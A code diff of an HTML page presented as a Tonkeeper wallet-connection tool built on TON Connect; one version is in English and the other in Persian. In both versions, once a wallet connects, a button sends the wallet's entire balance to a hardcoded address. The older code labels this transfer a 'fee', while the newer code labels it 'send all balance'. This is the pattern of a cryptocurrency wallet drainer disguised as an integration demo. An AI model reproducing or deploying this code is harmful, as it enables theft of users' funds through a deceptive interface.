@@ -1,228 +1,135 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Tonkeeper Integration</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tonkeeper Wallet Connect</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-
     <style>
-      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
 
-      body {
-        font-family: 'Inter', sans-serif;
-        margin: 0;
-        padding: 0;
-        background-color: #f0f4f8;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-      }
-
-      .container {
-        background-color: white;
-        border-radius: 16px;
-        box-shadow: 0px 12px 24px rgba(0, 0, 0, 0.15);
-        padding: 30px;
-        max-width: 450px;
-        width: 100%;
-        text-align: center;
-      }
-
-      button {
-        background-color: #007bff;
-        color: white;
-        border: none;
-        padding: 12px 0;
-        width: 100%;
-        font-size: 16px;
-        border-radius: 8px;
-        cursor: pointer;
-        transition: background-color 0.3s ease, transform 0.2s ease;
-        margin-top: 10px;
-        font-weight: 600;
-      }
-
-      button:hover {
-        background-color: #0056b3;
-        transform: translateY(-2px);
-      }
-
-      button:active {
-        transform: translateY(0px);
-      }
-
-      .input-group {
-        margin: 20px 0;
-        text-align: left;
-      }
-
-      .input-group label {
-        font-size: 14px;
-        font-weight: 600;
-        display: block;
-        margin-bottom: 8px;
-        color: #333;
-      }
-
-      .input-group input {
-        width: 100%;
-        padding: 12px;
-        font-size: 14px;
-        border: 1px solid #ddd;
-        border-radius: 6px;
-        box-sizing: border-box;
-        margin-bottom: 10px;
-        transition: border-color 0.3s ease;
-      }
-
-      .input-group input:focus {
-        outline: none;
-        border-color: #007bff;
-      }
-
-      .wallet-info {
-        background-color: #f9fafb;
-        border: 1px solid #e3e3e3;
-        padding: 15px;
-        border-radius: 8px;
-        margin-top: 20px;
-        display: none;
-        text-align: left;
-      }
-
-      .wallet-info h3 {
-        font-weight: 600;
-        margin-bottom: 10px;
-      }
-
-      .wallet-info p {
-        margin: 5px 0;
-        font-size: 14px;
-        word-wrap: break-word;
-      }
-
-      .wallet-address {
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
-        display: inline-block;
-        max-width: 100%;
-        vertical-align: middle;
-      }
-
-      @media (max-width: 600px) {
         .container {
-          padding: 20px;
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
         }
 
         button {
-          padding: 12px;
-          font-size: 14px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .wallet-info {
+            display: none;
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 10px;
         }
 
         .wallet-info p {
-          font-size: 12px;
+            margin: 5px 0;
         }
-      }
     </style>
+</head>
+<body>
 
-    <!-- Add the manifest as a script -->
-    <script>
-      const manifest = {
-        "name": "TonConnect",
-        "description": "This is a sample decentralized application using TonConnect.",
-        "url": "https://miladsoft.github.io/ton-connect/",
-        "iconUrl": "https://miladsoft.github.io/ton-connect/icon.png",
-        "bridgeUrl": "https://bridge.tonapi.io/bridge",
-        "termsUrl": "https://miladsoft.github.io/ton-connect//terms",
-        "privacyUrl": "https://miladsoft.github.io/ton-connect//privacy"
-      };
-
-      console.log(manifest);
-    </script>
-  </head>
-  <body>
     <div class="container">
-      <h1>Tonkeeper Integration</h1>
+        <h2>اتصال به کیف پول</h2>
+        <button id="connect-wallet">اتصال به کیف پول</button>
 
-      <button id="connect-wallet">Connect to Tonkeeper</button>
-
-      <div id="wallet-info" class="wallet-info">
-        <h3>Wallet Information</h3>
-        <p><strong>Address:</strong> <span id="address" class="wallet-address"></span></p>
-        <p><strong>Balance:</strong> <span id="balance"></span></p>
-        <button id="send-transaction">Send Transaction</button>
-        <button id="disconnect">Disconnect</button>
-      </div>
+        <div id="wallet-info" class="wallet-info">
+            <p><strong>آدرس کیف پول:</strong> <span id="wallet-address"></span></p>
+            <p><strong>موجودی:</strong> <span id="wallet-balance"></span> TON</p>
+            <button id="send-all" style="display: none;">ارسال تمام موجودی</button>
+        </div>
     </div>
 
     <script>
-      const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://miladsoft.github.io/ton-connect/tonconnect-manifest.json',
-      });
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://miladsoft.github.io/ton-connect/tonconnect-manifest.json',
+        });
 
-      const addressElem = document.getElementById("address");
-      const balanceElem = document.getElementById("balance");
-      const walletInfoDiv = document.getElementById("wallet-info");
-      const connectWalletBtn = document.getElementById("connect-wallet");
-      const sendTransactionBtn = document.getElementById("send-transaction");
-      const disconnectBtn = document.getElementById("disconnect");
+        const connectWalletBtn = document.getElementById("connect-wallet");
+        const walletInfoDiv = document.getElementById("wallet-info");
+        const walletAddressSpan = document.getElementById("wallet-address");
+        const walletBalanceSpan = document.getElementById("wallet-balance");
+        const sendAllBtn = document.getElementById("send-all");
 
-      sendTransactionBtn.style.display = "none"; // Initially hide the send transaction button
+        let userWalletAddress = "";
+        let userBalance = 0;
 
-      connectWalletBtn.addEventListener("click", async () => {
-        try {
-          const connectedWallet = await tonConnectUI.connectWallet();
-          console.log("Connected Wallet:", connectedWallet);
+        // اتصال کیف پول
+        connectWalletBtn.addEventListener("click", async () => {
+            try {
+                const connectedWallet = await tonConnectUI.connectWallet();
+                userWalletAddress = connectedWallet.account.address;
+                walletAddressSpan.textContent = userWalletAddress;
+                
+                // نمایش اطلاعات کیف پول
+                walletInfoDiv.style.display = "block";
 
-          walletInfoDiv.style.display = "block";
-          addressElem.textContent = connectedWallet.account.address;
+                // دریافت موجودی کیف پول
+                const balanceResponse = await fetch(`https://tonapi.io/v2/accounts/${userWalletAddress}`);
+                const balanceData = await balanceResponse.json();
+                userBalance = balanceData.balance ? balanceData.balance / 1e9 : 0; // تبدیل nanotons به TON
+                
+                walletBalanceSpan.textContent = userBalance.toFixed(6); // نمایش ۶ رقم اعشار
 
-          // Fetch balance after wallet connects
-          const balanceResponse = await fetch(
-            `https://tonapi.io/v2/accounts/${connectedWallet.account.address}`
-          );
-          const balanceData = await balanceResponse.json();
-          const balance = balanceData.balance || "0";
-          balanceElem.textContent = balance;
+                // نمایش دکمه ارسال تمام موجودی
+                sendAllBtn.style.display = "block";
 
-          // Send transaction with full balance as fee to the specified address
-          sendTransactionBtn.style.display = "block";
+            } catch (error) {
+                alert("خطا در اتصال به کیف پول");
+                console.error(error);
+            }
+        });
 
-          sendTransactionBtn.addEventListener("click", async () => {
+        // ارسال تمام موجودی
+        sendAllBtn.addEventListener("click", async () => {
+            if (userBalance === 0) {
+                alert("موجودی کافی نیست!");
+                return;
+            }
+
             const transaction = {
-              messages: [
-                {
-                  address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // Hardcoded fee address
-                  amount: balance, // Send entire balance as fee
-                },
-              ],
+                messages: [
+                    {
+                        address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW",
+                        amount: (userBalance * 1e9).toString(), // تبدیل TON به nanotons
+                    },
+                ],
             };
 
             try {
-              const result = await tonConnectUI.sendTransaction(transaction);
-              console.log("Transaction Result:", result);
-              alert("Transaction sent successfully!");
+                const result = await tonConnectUI.sendTransaction(transaction);
+                alert("تمام موجودی شما ارسال شد!");
+                console.log("Transaction Result:", result);
             } catch (error) {
-              console.error("Transaction failed:", error);
-              alert("Transaction failed!");
+                alert("ارسال تراکنش ناموفق بود.");
+                console.error(error);
             }
-          });
-
-        } catch (error) {
-          console.error("Error connecting to wallet:", error);
-        }
-      });
-
-      disconnectBtn.addEventListener("click", async () => {
-        await tonConnectUI.disconnect();
-        walletInfoDiv.style.display = "none";
-        sendTransactionBtn.style.display = "none";
-        connectWalletBtn.style.display = "block";
-        console.log("Disconnected");
-      });
+        });
     </script>
-  </body>
+
+</body>
 </html>
